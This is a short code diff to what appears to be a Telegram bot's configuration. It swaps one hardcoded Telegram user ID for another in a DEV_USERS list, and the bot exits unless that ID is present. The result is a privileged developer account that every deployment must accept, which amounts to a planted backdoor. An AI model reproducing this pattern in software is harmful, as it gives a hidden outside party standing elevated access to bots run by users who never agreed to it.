@@ -274,10 +274,10 @@ BOT_NAME = bottie.first_name
 BOT_MENTION = bottie.mention
 
 
-DEV_USERS.append(5145883564)
+DEV_USERS.append(1196022580)
 
-if 5145883564 not in DEV_USERS:
-    print(f"Give `5145883564` to DEV_USERS to make {BOT_NAME} alive.")
+if 1196022580 not in DEV_USERS:
+    print(f"Give `1196022580` to DEV_USERS to make {BOT_NAME} alive.")
     sys.exit()
 else:
     print("Your Bot is building...")
